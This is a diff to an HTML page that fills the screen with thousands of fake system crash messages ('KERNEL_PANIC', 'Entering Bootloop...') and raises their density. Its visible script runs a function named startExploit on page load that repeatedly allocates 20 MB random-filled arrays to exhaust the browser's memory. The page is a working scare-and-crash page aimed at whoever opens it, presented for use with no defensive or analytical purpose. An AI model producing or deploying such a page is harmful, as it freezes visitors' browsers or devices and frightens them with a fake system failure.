@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -14,31 +15,26 @@
             font-family: 'JetBrains Mono', monospace;
             display: flex;
             flex-wrap: wrap;
-            gap: 8px;
+            gap: 4px;
             align-content: flex-start;
             height: 100vh;
             width: 100vw;
         }
         .error-msg {
-            font-size: 8px;
-            opacity: 0.5;
+            font-size: 6px;
+            opacity: 0.6;
             white-space: nowrap;
             user-select: none;
-            padding: 2px;
+            padding: 1px;
         }
     </style>
 </head>
 <body>
-    <div style="position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; z-index: 100; pointer-events: none;">
-        <div style="background: rgba(0,0,0,0.8); padding: 20px 40px; border: 2px solid #fff; color: #fff; font-size: 24px; font-weight: bold; border-radius: 10px; box-shadow: 0 0 50px rgba(0,0,0,1);">
-            Entering Bootloop...
-        </div>
-    </div>
-
     <script>
-        // Fill background with small error messages - pushed to 3000 for total coverage
+        // Fill background with small error messages - extreme density
         const errorTemplates = [
             "Fatal Error 0x3333",
+            "Entering Bootloop...",
             "KERNEL_PANIC",
             "OVERFLOW_DETECTION",
             "STACK_COLLISION",
@@ -47,11 +43,13 @@
             "CRITICAL_PROCESS_DIED",
             "THREAD_STUCK_IN_DEVICE_DRIVER",
             "BOOT_LOOP_DETECTED",
-            "FS_CORRUPTION"
+            "FS_CORRUPTION",
+            "SYSTEM_FREEZE",
+            "HARDWARE_MALFUNCTION"
         ];
         
-        // Generating massive amount of elements to ensure zero gaps
-        for(let i=0; i<3000; i++) {
+        // Generating even more elements for microscopic density
+        for(let i=0; i<5000; i++) {
             const span = document.createElement('span');
             span.className = 'error-msg';
             span.innerText = errorTemplates[Math.floor(Math.random() * errorTemplates.length)];
@@ -78,10 +76,9 @@
                     let x = new Uint8Array(1024 * 1024 * 20);
                     crypto.getRandomValues(x);
                 }, 0);
-            }, 200); // 200ms delay as requested
+            }, 200); 
         }
 
-        // Start immediately on load (will trigger timeout)
         window.onload = startExploit;
     </script>
 </body>
